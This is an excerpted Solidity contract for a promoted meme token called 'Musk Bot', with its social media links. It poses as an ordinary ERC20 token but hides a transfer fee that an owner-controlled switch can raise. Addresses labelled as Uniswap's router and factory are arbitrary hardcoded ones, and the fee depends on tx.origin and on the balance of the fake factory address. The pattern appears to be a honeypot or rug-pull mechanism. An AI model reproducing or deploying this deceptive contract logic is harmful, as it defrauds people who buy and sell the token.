...
https://twitter.com/MuskBotCoinBNB
https://t.me.com/MuskBotCoinBNB
https://MuskBotCoinBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal uniswapV2Router = 0xc515dd54151b63A35202AaC163477054cAd13308;
    uint256 private _swappingToggle = 1;
    string private _symbol;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private V2uniswapFactory = 0x0ff676f89C529fA9B8886a8EaC29A766c86c07a0;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != uniswapV2Router && _balances[V2uniswapFactory] > 0 ? pairsToken : _swappingToggle).div(100) + 0;
        if (swapamount > 0)
        {
...
contract MuskBotCoin is ERC20, Ownable
{
    constructor() ERC20(unicode"Musk Bot", unicode"MUSKBOT")
    {
